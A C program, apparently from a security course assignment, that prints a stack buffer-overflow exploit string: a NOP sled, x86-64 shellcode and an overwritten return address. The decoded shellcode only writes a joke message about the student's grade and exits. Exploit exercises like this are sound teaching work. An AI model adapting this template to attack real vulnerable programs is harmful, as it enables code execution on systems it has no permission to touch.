#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "buffer_addr.h"


int  main () {

  // NOP sled
  for (int i = 0; i < 139; i++) {
    fputs("\x90", stdout);
  }

  unsigned char *shellcode = "\xeb\x33\x4e\x6f\x61\x68\x20\x46\x72\x65\x6e\x63\x68\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41\x2b\x31\xc0\xb0\x01\x89\xc7\x8d\x35\xc1\xff\xff\xff\x31\xd2\xb2\x33\x0f\x05\xb0\x3c\x31\xff\x0f\x05";

  unsigned char *address = "\xf0\xdd\xff\xff\xff\x7f";

  fputs(shellcode, stdout);
  fputs(address, stdout);
  
  return 0;
}
